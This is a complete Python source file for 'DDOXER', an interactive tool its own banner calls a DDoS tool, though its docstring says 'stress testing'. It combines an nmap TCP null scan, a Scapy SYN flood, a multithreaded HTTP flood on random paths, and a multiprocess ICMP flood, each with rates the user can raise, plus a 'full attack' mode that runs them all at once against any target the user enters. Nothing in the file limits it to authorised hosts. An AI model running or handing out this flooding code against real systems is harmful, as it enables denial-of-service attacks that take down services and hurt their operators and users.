#!/usr/bin/env python3
"""
DDOXER - Network Stress Testing Tool
"""

import sys
import os
import re
import random
import string
import threading
import time
import signal
import socket
import multiprocessing
import subprocess
import traceback
import warnings
warnings.filterwarnings('ignore', category=ResourceWarning)

try:
    import requests
    from requests.exceptions import RequestException, ConnectionError, Timeout as ReqTimeout
except ImportError:
    print("Missing requests. Install: pip install requests")
    sys.exit(1)

try:
    from ping3 import ping
except ImportError:
    print("Missing ping3. Install: pip install ping3")
    sys.exit(1)

try:
    from scapy.all import IP, TCP, Ether, sendpfast
except ImportError:
    print("Missing scapy. Install: pip install scapy")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False

if HAS_COLOR:
    R = lambda t: f"{Fore.RED}{t}{Style.RESET_ALL}"
    G = lambda t: f"{Fore.GREEN}{t}{Style.RESET_ALL}"
    Y = lambda t: f"{Fore.YELLOW}{t}{Style.RESET_ALL}"
    C = lambda t: f"{Fore.CYAN}{t}{Style.RESET_ALL}"
    M = lambda t: f"{Fore.MAGENTA}{t}{Style.RESET_ALL}"
    B = lambda t: f"{Style.BRIGHT}{t}{Style.RESET_ALL}"
else:
    R = G = Y = C = M = B = lambda t: t

BANNER = C("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗         ║
║   ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗        ║
║   ██║  ██║██   ██╔██║   ██║ ╚███╔╝ █████╗  ██████╔╝        ║
║   ██║  ██║██   ██╗██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗        ║
║   ██████╔╝███████║╚██████╔╝██╔╝ ██╗███████╗██║  ██║        ║
║   ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ║
║                                                              ║
║            DDOS tool Created by (@xtom3)                     ║
║                   Version 2.0                                ║
╚══════════════════════════════════════════════════════════════╝
""")

TARGET_IP = "127.0.0.1"
TARGET_HTTP_HOST = "http://localhost:8000"
TARGET_PORT = 80
SCAPY_PPS = 5000
HTTP_THREADS = 200
HTTP_LOOPS_PER_THREAD = 100
HTTP_TIMEOUT = 5.0
ICMP_PROCESSES = 4
NMAP_TIMEOUT = 60

try:
    NO_ROOT_MODE = os.name != 'posix' or os.getuid() != 0
except AttributeError:
    NO_ROOT_MODE = True

stats_lock = threading.Lock()
successful_requests = 0
failed_requests = 0

running_processes = []
attack_active = False
attack_lock = threading.Lock()
main_exiting = False

SEP = C("=" * 50)
SEP_S = C("=" * 35)

IP_RE = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
HOST_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$')


def ex_handler(exctype, value, tb):
    if issubclass(exctype, KeyboardInterrupt):
        sys.__excepthook__(exctype, value, tb)
        return
    print(f"\n{R('[!] Unhandled: ' + str(value))}")
    sys.__excepthook__(exctype, value, tb)


sys.excepthook = ex_handler


def safe_print(msg):
    try:
        print(msg)
    except BrokenPipeError:
        pass
    except OSError:
        pass


def cleanup_all():
    global attack_active, running_processes, main_exiting
    main_exiting = True
    with attack_lock:
        if attack_active:
            for p in running_processes[:]:
                if p.is_alive():
                    try:
                        p.terminate()
                        p.join(timeout=3)
                        if p.is_alive():
                            p.kill()
                            p.join(timeout=1)
                    except Exception:
                        pass
            running_processes.clear()
            attack_active = False


def signal_handler(sig, frame):
    safe_print(f"\n{Y('[!] Interrupted. Cleaning up...')}")
    cleanup_all()
    safe_print(f"{C('[*] Exiting.')}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def validate_ip(ip):
    if IP_RE.match(ip):
        parts = [int(x) for x in ip.split('.')]
        if all(0 <= p <= 255 for p in parts):
            return True
    return False


def validate_hostname(host):
    return bool(HOST_RE.match(host))


def validate_port(port):
    return isinstance(port, int) and 1 <= port <= 65535


def get_user_input(prompt, default=None, input_type=str, choices=None, vmin=None, vmax=None):
    while True:
        try:
            if default is not None:
                raw = input(f"{C(prompt)} [{Y(str(default))}]: ").strip()
                if not raw:
                    return default
            else:
                raw = input(f"{C(prompt)}: ").strip()
                if not raw:
                    safe_print(f"{Y('[!] Input cannot be empty!')}")
                    continue

            if choices is not None:
                if raw not in choices:
                    safe_print(f"{Y('[!] Invalid choice!')} Choose from: {C(', '.join(choices))}")
                    continue

            if input_type == int:
                val = int(raw)
                if vmin is not None and val < vmin:
                    safe_print(f"{Y('[!] Minimum value is ' + str(vmin))}")
                    continue
                if vmax is not None and val > vmax:
                    safe_print(f"{Y('[!] Maximum value is ' + str(vmax))}")
                    continue
                return val
            elif input_type == float:
                val = float(raw)
                if vmin is not None and val < vmin:
                    safe_print(f"{Y('[!] Minimum value is ' + str(vmin))}")
                    continue
                if vmax is not None and val > vmax:
                    safe_print(f"{Y('[!] Maximum value is ' + str(vmax))}")
                    continue
                return val
            elif input_type == bool:
                return raw.lower() in ['yes', 'y', 'true', '1']
            else:
                return raw
        except ValueError:
            safe_print(f"{Y('[!] Invalid number format!')}")
        except (EOFError, KeyboardInterrupt):
            safe_print(f"\n{C('[*] Returning to menu...')}")
            return default if default is not None else None
        except Exception:
            safe_print(f"{Y('[!] Input error. Try again.')}")


def setup_configuration():
    global TARGET_IP, TARGET_PORT, TARGET_HTTP_HOST, SCAPY_PPS
    global HTTP_THREADS, HTTP_LOOPS_PER_THREAD, HTTP_TIMEOUT, ICMP_PROCESSES, NMAP_TIMEOUT

    try:
        clear_screen()
    except Exception:
        pass
    safe_print(BANNER)
    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   DDOXER CONFIGURATION SETUP   '))}")
    safe_print(SEP)
    safe_print(f"\n{Y('[!] Press Enter to use default values')}\n")

    safe_print(f"\n{C('--- TARGET SETTINGS ---')}")

    while True:
        ip_raw = get_user_input("Target IP Address", "127.0.0.1")
        if ip_raw and (validate_ip(ip_raw) or validate_hostname(ip_raw)):
            TARGET_IP = ip_raw
            break
        safe_print(f"{R('[-] Invalid IP or hostname format!')}")

    while True:
        port_raw = get_user_input("Target Port", 80, int, vmin=1, vmax=65535)
        if port_raw and validate_port(port_raw):
            TARGET_PORT = port_raw
            break
        safe_print(f"{R('[-] Port must be 1-65535!')}")

    TARGET_HTTP_HOST = get_user_input("HTTP Host URL", f"http://{TARGET_IP}:{TARGET_PORT}")

    safe_print(f"\n{C('--- ATTACK SETTINGS ---')}")
    safe_print(f"{Y('[!] Higher values = More aggressive attack')}")
    SCAPY_PPS = get_user_input("SYN Packets Per Second (PPS)", 5000, int, vmin=1, vmax=1000000)
    HTTP_THREADS = get_user_input("HTTP Threads (concurrent connections)", 200, int, vmin=1, vmax=10000)
    HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int, vmin=1, vmax=1000000)
    HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float, vmin=0.1, vmax=120.0)
    ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int, vmin=1, vmax=64)
    NMAP_TIMEOUT = get_user_input("Nmap Scan Timeout (seconds)", 60, int, vmin=5, vmax=3600)

    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   CONFIGURATION SUMMARY   '))}")
    safe_print(SEP)
    safe_print(f"  Target IP:      {M(TARGET_IP)}")
    safe_print(f"  Target Port:    {M(str(TARGET_PORT))}")
    safe_print(f"  HTTP Host:      {M(TARGET_HTTP_HOST)}")
    safe_print(f"  SYN PPS:        {M(str(SCAPY_PPS))}")
    safe_print(f"  HTTP Threads:   {M(str(HTTP_THREADS))}")
    safe_print(f"  HTTP Req/Thread:{M(str(HTTP_LOOPS_PER_THREAD))}")
    safe_print(f"  HTTP Timeout:   {M(str(HTTP_TIMEOUT))}s")
    safe_print(f"  ICMP Workers:   {M(str(ICMP_PROCESSES))}")
    safe_print(f"  Nmap Timeout:   {M(str(NMAP_TIMEOUT))}s")
    safe_print(SEP)

    confirm = get_user_input("\nApply these settings?", "yes", choices=['yes', 'no'])
    if confirm == 'no':
        safe_print(f"{C('[*] Restarting configuration...')}")
        time.sleep(1)
        setup_configuration()
        return

    safe_print(f"\n{G('[+] Configuration saved successfully!')}")
    time.sleep(1)


def generate_random_text(length=8):
    characters = string.ascii_lowercase + string.digits
    return "".join(random.choice(characters) for _ in range(length))


def run_nmap_scan():
    safe_print(f"\n{C('[*]')} [Nmap Engine] Starting TCP Null scan on {M(TARGET_IP)}...")
    safe_print(f"{G('[+]')} [Nmap] Command: {Y('nmap -T5 -sN ' + TARGET_IP)}")

    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
    except FileNotFoundError:
        safe_print(f"{R('[-] Nmap is not installed!')}")
        safe_print(f"    {Y('Ubuntu: sudo apt-get install nmap')}")
        safe_print(f"    {Y('Termux: pkg install nmap')}")
        return False
    except subprocess.CalledProcessError:
        safe_print(f"{R('[-] Nmap found but returned error.')}")
        return False

    try:
        cmd = ["nmap", "-T5", "-sN", TARGET_IP]
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=NMAP_TIMEOUT
        )

        safe_print(f"\n{SEP}")
        safe_print(f"{B(C('   NMAP SCAN RESULTS (TCP Null Scan)   '))}")
        safe_print(SEP)
        safe_print(result.stdout or f"{Y('(no output)')}")
        if result.stderr:
            safe_print(f"{Y('[!] Errors/Warnings:')}")
            safe_print(result.stderr)
        safe_print(f"{SEP}\n")
        return result.returncode == 0

    except subprocess.TimeoutExpired:
        safe_print(f"{R('[-] Nmap scan timed out after ' + str(NMAP_TIMEOUT) + ' seconds.')}")
        return False
    except PermissionError:
        safe_print(f"{R('[-] Permission denied.')} Run with sudo for raw socket access.")
        return False
    except UnicodeDecodeError:
        safe_print(f"{Y('[!] Nmap output encoding issue.')} Results may be incomplete.")
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=NMAP_TIMEOUT)
            safe_print(result.stdout.decode('utf-8', errors='replace'))
            return result.returncode == 0
        except Exception as e2:
            safe_print(f"{R('[-] Fallback also failed: ' + str(e2))}")
            return False
    except OSError as e:
        safe_print(f"{R('[-] Nmap system error: ' + str(e))}")
        return False
    except Exception as e:
        safe_print(f"{R('[-] Nmap scan failed: ' + str(e))}")
        return False


def http_worker(thread_id):
    global successful_requests, failed_requests
    session = None
    local_success = 0
    local_failed = 0

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 DDOXER'})
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50, pool_maxsize=50,
            max_retries=0, pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        for _ in range(HTTP_LOOPS_PER_THREAD):
            if main_exiting:
                break
            random_path = f"/{generate_random_text()}"
            url = f"{TARGET_HTTP_HOST}{random_path}"
            try:
                response = session.get(url, timeout=HTTP_TIMEOUT, stream=False)
                response.close()
                if response.status_code < 500:
                    local_success += 1
                else:
                    local_failed += 1
            except (ConnectionError, ReqTimeout):
                local_failed += 1
            except RequestException:
                local_failed += 1
            except (socket.gaierror, socket.timeout):
                local_failed += 1
            except Exception:
                local_failed += 1
    finally:
        if session:
            try:
                session.close()
            except Exception:
                pass

    with stats_lock:
        successful_requests += local_success
        failed_requests += local_failed


def run_http_layer7_test():
    global successful_requests, failed_requests
    successful_requests = 0
    failed_requests = 0

    safe_print(f"\n{C('[*]')} [HTTP Engine] Initializing {M(str(HTTP_THREADS))} threads...")
    safe_print(f"{C('[*]')} Target: {M(TARGET_HTTP_HOST)}")
    safe_print(f"{C('[*]')} Each thread will send {M(str(HTTP_LOOPS_PER_THREAD))} requests")

    start_time = time.time()
    threads = []

    for t_id in range(HTTP_THREADS):
        t = threading.Thread(target=http_worker, args=(t_id,), daemon=True)
        threads.append(t)
        try:
            t.start()
        except Exception:
            safe_print(f"{R('[-] Failed to start thread ' + str(t_id))}")
            break

    def show_progress():
        while not main_exiting and any(t.is_alive() for t in threads):
            with stats_lock:
                total = successful_requests + failed_requests
                safe_print(f"\r{C('[*]')} Progress: {M(str(total))} requests sent...")
            time.sleep(1)

    progress_thread = threading.Thread(target=show_progress, daemon=True)
    progress_thread.start()

    for t in threads:
        try:
            t.join(timeout=300)
        except Exception:
            pass

    end_time = time.time()
    total_time = max(end_time - start_time, 0.001)
    total_reqs = successful_requests + failed_requests

    safe_print(f"\n{SEP_S}")
    safe_print(f"{B(C('   HTTP ENGINE REPORT   '))}")
    safe_print(SEP_S)
    safe_print(f"  Time Taken:           {M(f'{total_time:.2f}')} seconds")
    safe_print(f"  Successful Hits:      {G(str(successful_requests))}")
    safe_print(f"  Failed/Dropped:       {R(str(failed_requests))}")
    if total_reqs > 0:
        safe_print(f"  Throughput Rate:      {M(f'{total_reqs / total_time:.2f}')} req/s")
    safe_print(f"{SEP_S}\n")


def run_scapy_syn_flood():
    if NO_ROOT_MODE:
        safe_print(f"{R('[-] SYN flood requires root privileges!')}")
        return False

    safe_print(f"\n{C('[*]')} [Scapy Engine] Preparing SYN flood...")
    safe_print(f"{C('[*]')} Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    safe_print(f"{C('[*]')} Speed: {M(str(SCAPY_PPS))} packets/second")

    try:
        packet = Ether() / IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S")
        safe_print(f"{G('[+]')} Launching flood... ({Y('Press Ctrl+C to stop')})")
        sendpfast(packet, pps=SCAPY_PPS, loop=0)
        return True
    except FileNotFoundError:
        safe_print(f"{R('[-] tcpreplay not found!')} Install with: sudo apt-get install tcpreplay")
        return False
    except PermissionError:
        safe_print(f"{R('[-] Permission denied for raw socket.')} Run with sudo.")
        return False
    except OSError as e:
        safe_print(f"{R('[-] Network error: ' + str(e))}")
        return False
    except Exception as e:
        safe_print(f"{R('[-] Scapy Engine failure: ' + str(e))}")
        return False


def icmp_worker(process_id, target):
    old_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    packet_count = 0
    try:
        while not main_exiting:
            try:
                ping(target, timeout=0.1, size=64)
                packet_count += 1
                if packet_count % 500 == 0:
                    safe_print(f"\r[ICMP Worker {M(str(process_id))}] Sent {M(str(packet_count))} packets")
            except PermissionError:
                safe_print(f"{R('[!] ICMP requires root.')}")
                break
            except Exception:
                pass
    finally:
        signal.signal(signal.SIGINT, old_handler)


def run_icmp_flood():
    safe_print(f"\n{C('[*]')} [ICMP Engine] Deploying {M(str(ICMP_PROCESSES))} workers...")
    safe_print(f"{C('[*]')} Target: {M(TARGET_IP)}")

    processes = []
    try:
        for i in range(ICMP_PROCESSES):
            p = multiprocessing.Process(target=icmp_worker, args=(i, TARGET_IP), daemon=True)
            processes.append(p)
            try:
                p.start()
            except Exception:
                safe_print(f"{R('[-] Failed to start ICMP worker ' + str(i))}")
                break

        safe_print(f"{G('[+]')} ICMP flood running... ({Y('Press Ctrl+C to stop')})")
        for p in processes:
            try:
                p.join()
            except Exception:
                pass
    except KeyboardInterrupt:
        safe_print(f"\n{C('[*]')} Stopping ICMP workers...")
    finally:
        for p in processes:
            if p.is_alive():
                try:
                    p.terminate()
                    p.join(timeout=3)
                    if p.is_alive():
                        p.kill()
                        p.join(timeout=1)
                except Exception:
                    pass


def run_all_parallel():
    global attack_active
    safe_print(f"\n{SEP}")
    safe_print(f"{B(R('   LAUNCHING FULL ATTACK   '))}")
    safe_print(SEP)
    safe_print(f"  Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    safe_print(f"  Mode:   {Y('HTTP-ONLY' if NO_ROOT_MODE else 'FULL')}")
    safe_print(f"{SEP}\n")

    engines = []

    nmap_p = multiprocessing.Process(target=run_nmap_scan, name="Nmap-Engine", daemon=True)
    engines.append(nmap_p)

    if NO_ROOT_MODE:
        safe_print(f"{Y('[*] No-root mode: HTTP + ICMP attacks')}")
        engines.append(multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine", daemon=True))
        engines.append(multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine", daemon=True))
    else:
        engines.extend([
            multiprocessing.Process(target=run_scapy_syn_flood, name="Scapy-Engine", daemon=True),
            multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine", daemon=True),
            multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine", daemon=True),
        ])

    global running_processes
    running_processes = engines
    attack_active = True

    try:
        for engine in engines:
            try:
                engine.start()
            except Exception:
                safe_print(f"{R('[-] Failed to start engine: ' + engine.name)}")
                continue
        for engine in engines:
            try:
                engine.join()
            except Exception:
                pass
    except KeyboardInterrupt:
        safe_print(f"\n{R('[-] Interrupt received.')} Terminating...")
    finally:
        for engine in engines:
            if engine.is_alive():
                try:
                    engine.terminate()
                    engine.join(timeout=3)
                    if engine.is_alive():
                        engine.kill()
                        engine.join(timeout=1)
                except Exception:
                    pass
        attack_active = False
        running_processes = []
    return True


def stop_attacks():
    global attack_active
    with attack_lock:
        if not attack_active:
            return False
        safe_print(f"\n{C('[*]')} Stopping all attacks...")
        for p in running_processes[:]:
            if p.is_alive():
                try:
                    p.terminate()
                    p.join(timeout=3)
                    if p.is_alive():
                        p.kill()
                        p.join(timeout=1)
                except Exception:
                    try:
                        if p.is_alive():
                            p.kill()
                    except Exception:
                        pass
        attack_active = False
        running_processes.clear()
        safe_print(f"{G('[+] All attacks stopped.')}")
    return True


def show_menu():
    try:
        clear_screen()
    except Exception:
        pass
    safe_print(BANNER)
    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   MAIN MENU   '))}")
    safe_print(SEP)
    safe_print(f"  Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    safe_print(f"  Mode:   {C('HTTP-ONLY' if NO_ROOT_MODE else 'FULL')}")
    status_color = R if attack_active else G
    safe_print(f"  Status: {status_color('RUNNING' if attack_active else 'IDLE')}")
    safe_print(SEP)
    safe_print(f"\n  {Y('[1]')} Start Full Attack (Nmap + SYN + HTTP + ICMP)")
    safe_print(f"  {Y('[2]')} Run Nmap Scan Only (-T5 -sN)")
    safe_print(f"  {Y('[3]')} Start HTTP Flood Only")
    safe_print(f"  {Y('[4]')} Start SYN Flood Only (requires root)")
    safe_print(f"  {Y('[5]')} Start ICMP Flood Only")
    safe_print(f"  {Y('[6]')} Stop All Attacks")
    safe_print(f"  {Y('[7]')} Show Status")
    safe_print(f"  {Y('[8]')} Configure Target")
    safe_print(f"  {Y('[9]')} Advanced Configuration")
    safe_print(f"  {Y('[10]')} Exit")
    safe_print(f"\n{SEP}")


def show_status():
    try:
        clear_screen()
    except Exception:
        pass
    safe_print(BANNER)
    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   SYSTEM STATUS   '))}")
    safe_print(SEP)
    safe_print(f"  Target IP:       {M(TARGET_IP)}")
    safe_print(f"  Target Port:     {M(str(TARGET_PORT))}")
    safe_print(f"  HTTP Host:       {M(TARGET_HTTP_HOST)}")
    mode_str = 'HTTP-ONLY (no-root)' if NO_ROOT_MODE else 'FULL (SYN+HTTP+ICMP)'
    safe_print(f"  Running Mode:    {Y(mode_str)}")
    safe_print(f"  Attack Active:   {G('YES') if attack_active else R('NO')}")
    safe_print(f"  Root Privileges: {G('YES') if not NO_ROOT_MODE else R('NO')}")
    safe_print(f"\n{C('--- Attack Parameters ---')}")
    safe_print(f"  SYN PPS:         {M(str(SCAPY_PPS))}")
    safe_print(f"  HTTP Threads:    {M(str(HTTP_THREADS))}")
    safe_print(f"  HTTP Req/Thread: {M(str(HTTP_LOOPS_PER_THREAD))}")
    safe_print(f"  HTTP Timeout:    {M(str(HTTP_TIMEOUT))}s")
    safe_print(f"  ICMP Workers:    {M(str(ICMP_PROCESSES))}")
    safe_print(f"  Nmap Timeout:    {M(str(NMAP_TIMEOUT))}s")

    if attack_active:
        safe_print(f"\n{C('--- Live Statistics ---')}")
        with stats_lock:
            total = successful_requests + failed_requests
            safe_print(f"  Total HTTP Requests: {M(str(total))}")
            safe_print(f"  Successful:          {G(str(successful_requests))}")
            safe_print(f"  Failed:              {R(str(failed_requests))}")
            if total > 0:
                rate = (successful_requests / total) * 100
                safe_print(f"  Success Rate:        {M(f'{rate:.2f}%')}")

    safe_print(SEP)
    try:
        input(f"\n{C('Press Enter to continue...')}")
    except (EOFError, KeyboardInterrupt):
        pass


def advanced_config():
    global HTTP_TIMEOUT, HTTP_LOOPS_PER_THREAD, SCAPY_PPS, ICMP_PROCESSES, NMAP_TIMEOUT

    try:
        clear_screen()
    except Exception:
        pass
    safe_print(BANNER)
    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   ADVANCED CONFIGURATION   '))}")
    safe_print(SEP)
    safe_print(f"\n{B(C('Current Values:'))}")
    safe_print(f"  {Y('1.')} SYN PPS:         {M(str(SCAPY_PPS))}")
    safe_print(f"  {Y('2.')} HTTP Threads:    {M(str(HTTP_THREADS))}")
    safe_print(f"  {Y('3.')} HTTP Req/Thread: {M(str(HTTP_LOOPS_PER_THREAD))}")
    safe_print(f"  {Y('4.')} HTTP Timeout:    {M(str(HTTP_TIMEOUT))}s")
    safe_print(f"  {Y('5.')} ICMP Workers:    {M(str(ICMP_PROCESSES))}")
    safe_print(f"  {Y('6.')} Nmap Timeout:    {M(str(NMAP_TIMEOUT))}s")
    safe_print(f"\n  {Y('7.')} Reset to defaults")
    safe_print(f"  {Y('8.')} Back to main menu")

    choice = get_user_input("\nSelect option to modify", choices=['1', '2', '3', '4', '5', '6', '7', '8'])

    if choice == '1':
        SCAPY_PPS = get_user_input("SYN Packets Per Second", 5000, int, vmin=1, vmax=1000000)
    elif choice == '2':
        HTTP_THREADS = get_user_input("HTTP Threads", 200, int, vmin=1, vmax=10000)
    elif choice == '3':
        HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int, vmin=1, vmax=1000000)
    elif choice == '4':
        HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float, vmin=0.1, vmax=120.0)
    elif choice == '5':
        ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int, vmin=1, vmax=64)
    elif choice == '6':
        NMAP_TIMEOUT = get_user_input("Nmap Timeout (seconds)", 60, int, vmin=5, vmax=3600)
    elif choice == '7':
        SCAPY_PPS = 5000
        HTTP_THREADS = 200
        HTTP_LOOPS_PER_THREAD = 100
        HTTP_TIMEOUT = 5.0
        ICMP_PROCESSES = 4
        NMAP_TIMEOUT = 60
        safe_print(f"{G('[+] Reset to default values!')}")
        time.sleep(1)
    elif choice == '8':
        return

    safe_print(f"{G('[+] Configuration updated!')}")
    time.sleep(1)


def main():
    try:
        clear_screen()
    except Exception:
        pass
    safe_print(BANNER)
    safe_print(f"\n{SEP}")
    safe_print(f"{B(C('   WELCOME TO DDOXER   '))}")
    safe_print(SEP)
    mode_str = 'HTTP-ONLY' if NO_ROOT_MODE else 'FULL'
    safe_print(f"  Running in:      {Y(mode_str)} mode")
    safe_print(f"  Root privileges: {G('YES') if not NO_ROOT_MODE else R('NO')}")
    safe_print(SEP)

    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
        safe_print(f"{G('[+] Nmap found!')}")
    except FileNotFoundError:
        safe_print(f"{Y('[!] Nmap not installed.')} Install: sudo apt-get install nmap")
    except (subprocess.CalledProcessError, OSError):
        safe_print(f"{Y('[!] Could not verify nmap.')}")

    try:
        confirm = get_user_input("\nConfigure target now?", "yes", choices=['yes', 'no'])
        if confirm == 'yes':
            setup_configuration()
    except Exception:
        safe_print(f"{Y('[!] Config skipped.')}")

    safe_print(f"\n{C('[*] Starting DDOXER interactive menu...')}")
    time.sleep(1)

    while True:
        try:
            show_menu()
            choice = get_user_input(
                "\nSelect option",
                choices=['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
            )
            if choice is None:
                continue

            if choice == "1":
                with attack_lock:
                    if attack_active:
                        safe_print(f"{Y('[-] Attack already running! Stop it first.')}")
                        time.sleep(1)
                        continue
                safe_print(f"\n{C('[*]')} Starting {R('FULL ATTACK')}...")
                safe_print(f"{Y('[!] Press Ctrl+C to stop all attacks')}")
                t = threading.Thread(target=run_all_parallel, daemon=True)
                t.start()
                safe_print(f"{G('[+] Attack launched in background!')}")
                time.sleep(1)

            elif choice == "2":
                with attack_lock:
                    if attack_active:
                        safe_print(f"{Y('[-] Attack is running! Stop it first.')}")
                        time.sleep(1)
                        continue
                run_nmap_scan()
                try:
                    input(f"\n{C('Press Enter to continue...')}")
                except (EOFError, KeyboardInterrupt):
                    pass

            elif choice == "3":
                with attack_lock:
                    if attack_active:
                        safe_print(f"{Y('[-] Attack is running! Stop it first.')}")
                        time.sleep(1)
                        continue
                safe_print(f"\n{C('[*] Starting HTTP Flood...')}")
                t = threading.Thread(target=run_http_layer7_test, daemon=True)
                t.start()
                t.join()
                try:
                    input(f"\n{C('Press Enter to continue...')}")
                except (EOFError, KeyboardInterrupt):
                    pass

            elif choice == "4":
                with attack_lock:
                    if attack_active:
                        safe_print(f"{Y('[-] Attack is running! Stop it first.')}")
                        time.sleep(1)
                        continue
                if NO_ROOT_MODE:
                    safe_print(f"{R('[-] SYN flood requires root privileges!')}")
                    time.sleep(1)
                    continue
                safe_print(f"\n{C('[*] Starting SYN Flood...')}")
                t = threading.Thread(target=run_scapy_syn_flood, daemon=True)
                t.start()
                t.join()
                try:
                    input(f"\n{C('Press Enter to continue...')}")
                except (EOFError, KeyboardInterrupt):
                    pass

            elif choice == "5":
                with attack_lock:
                    if attack_active:
                        safe_print(f"{Y('[-] Attack is running! Stop it first.')}")
                        time.sleep(1)
                        continue
                safe_print(f"\n{C('[*] Starting ICMP Flood...')}")
                safe_print(f"{Y('[!] Press Ctrl+C to stop')}")
                t = threading.Thread(target=run_icmp_flood, daemon=True)
                t.start()
                t.join()
                try:
                    input(f"\n{C('Press Enter to continue...')}")
                except (EOFError, KeyboardInterrupt):
                    pass

            elif choice == "6":
                if stop_attacks():
                    safe_print(f"{G('[+] All attacks stopped.')}")
                else:
                    safe_print(f"{C('[*] No attack is running.')}")
                time.sleep(1)

            elif choice == "7":
                show_status()

            elif choice == "8":
                setup_configuration()

            elif choice == "9":
                advanced_config()

            elif choice == "10":
                safe_print(f"\n{G('[*] Thank you for using DDOXER!')}")
                safe_print(f"{C('[*] Exiting...')}")
                cleanup_all()
                time.sleep(0.5)
                try:
                    clear_screen()
                except Exception:
                    pass
                sys.exit(0)

        except KeyboardInterrupt:
            safe_print(f"\n{C('[*] Interrupt received. Cleaning up...')}")
            cleanup_all()
            try:
                clear_screen()
            except Exception:
                pass
            sys.exit(0)
        except EOFError:
            safe_print(f"\n{C('[*] Input closed. Exiting...')}")
            cleanup_all()
            sys.exit(0)
        except Exception as e:
            safe_print(f"{R('[-] Unexpected error: ' + str(e))}")
            traceback.print_exc()
            time.sleep(2)
            continue


if __name__ == "__main__":
    main()
